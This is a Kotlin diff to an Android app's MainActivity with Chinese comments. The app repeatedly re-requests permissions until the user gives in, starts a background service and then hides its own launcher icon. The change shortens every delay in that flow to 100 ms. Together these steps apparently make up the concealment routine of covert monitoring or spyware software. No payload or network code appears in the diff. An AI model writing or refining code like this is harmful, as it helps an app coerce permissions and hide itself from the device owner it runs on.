@@ -45,15 +45,15 @@ class MainActivity : AppCompatActivity() {
             Log.d(TAG, "✅ 權限已全部授權")
             handler.postDelayed({
                 checkBatteryOptimization()
-            }, 1000)
+            }, 100)
         } else {
             Log.e(TAG, "❌ 權限被拒絕，重試...")
             Toast.makeText(this, "Permissions error", Toast.LENGTH_SHORT).show()
             
             // 延遲重試，直到使用者接受
             handler.postDelayed({
-                permissionLauncher.launch(requiredPermissions)
-            }, 500)
+                checkCurrentStatusAndProceed()
+            }, 100)
         }
     }
 
@@ -61,10 +61,10 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // 自動啟動流程：延遲 1 秒開始
+        // 自動啟動流程：延遲開始
         handler.postDelayed({
             startAutoFlow()
-        }, 1000)
+        }, 100)
     }
 
     override fun onResume() {
@@ -73,7 +73,7 @@ class MainActivity : AppCompatActivity() {
         if (isProcessing) {
             handler.postDelayed({
                 checkCurrentStatusAndProceed()
-            }, 1000)
+            }, 100)
         }
     }
 
@@ -122,7 +122,7 @@ class MainActivity : AppCompatActivity() {
         // 停頓 1.5 秒執行最後啟動
         handler.postDelayed({
             startServiceAndHideIcon()
-        }, 1500)
+        }, 100)
     }
 
     /** 終極步驟：啟動背景服務並銷毀桌面圖示 */
@@ -170,6 +170,6 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed({
             isProcessing = false
             finish()
-        }, 1500)
+        }, 100)
     }
 }
